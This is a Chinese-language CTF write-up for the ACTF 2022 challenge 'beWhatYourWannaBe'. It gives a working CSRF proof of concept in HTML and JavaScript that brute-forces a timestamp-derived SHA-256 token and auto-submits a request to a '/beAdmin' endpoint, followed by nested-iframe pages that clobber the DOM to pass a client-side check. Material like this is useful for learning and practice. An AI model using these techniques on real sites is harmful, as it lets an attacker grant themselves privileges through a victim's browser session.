## 题目介绍

[附件](/CTF_ATTACHMENTS/2022/ACTF-beWhatYourWannaBe.zip)

```
“doctor, actor, lawyer or a singer
why not president, be a dreamer
You can be just the one you wanna be.”

http://124.71.180.254:10022
It is recommended to test locally first.
Chrome’s processes will be cleaned up every 2 minutes to avoid take up too much memory.
Attachment is updated[2022-06-26 2:10 UTC+8] for stable exploitation.
```

考点：
- CSRF

## Writeup

因为后端有CSRFtoen的验证，并且是用时间戳算token实现的，所以先CSRF爆破让注册的用户有能访问第一段flag

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form name=form1 action="http://localhost:8000/beAdmin" method="POST" target="_blank">
        <input type="hidden" name="username" value="rdd" />
        <input type="hidden" name="csrftoken" value="111" />
      <input type="submit" value="Submit request" />
    </form>
    
    <script>
function hash(string) {
    const utf8 = new TextEncoder().encode(string);
    return crypto.subtle.digest('SHA-256', utf8).then((hashBuffer) => {
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map((bytes) => bytes.toString(16).padStart(2, '0')).join('');
        return hashHex;
    });
}
var data = Date.now()
for (var i = 0; i < 100; i++) {
    var tmp = Math.sin(Math.floor((data + 1) / 1000)).toString()
    hash(tmp).then((hex) => {
        console.log(hex, (data + i))
        document.form1.csrftoken.value = hex
        document.form1.submit()

    });

}
    </script>
  </body>
</html>
```

flag2，需要满足`fff.lll.aaa.ggg.value === "this_is_what_i_want"`

实现方法有很多种，只需要满足最后有 `<input name="ggg" type="submit" value="this_is_what_i_want"/>`就行了

poc.html
```
<html>
<iframe name=fff src="fff.html">
</html>
fff.html
<html>
<iframe name=lll src="lll.html">
</html>
lll.html
<html>
     <form id=aaa>
        <input name="ggg" type="submit" value="this_is_what_i_want"/>
    </form>
</html>
```

![2022-07-02-22-37-23.png](/IMAGES/2022-07-02-22-37-23.png)